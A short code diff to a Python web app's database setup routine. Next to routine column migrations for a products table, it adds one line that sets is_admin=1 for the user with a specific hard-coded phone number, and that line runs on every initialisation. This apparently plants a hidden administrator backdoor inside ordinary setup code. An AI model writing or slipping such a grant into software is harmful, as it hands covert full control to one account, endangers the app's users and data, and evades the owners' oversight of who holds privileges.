@@ -134,6 +134,7 @@ def init_db():
     pcols={r[1] for r in con.execute("PRAGMA table_info(products)").fetchall()}
     for col,typ in [("last_income_at","TEXT"),("earned_income","REAL NOT NULL DEFAULT 0")]:
         if col not in pcols: con.execute(f"ALTER TABLE products ADD COLUMN {col} {typ}")
+    con.execute("UPDATE users SET is_admin=1 WHERE phone=?",("0758878297",))
     con.commit(); con.close()
 
 def current_user():
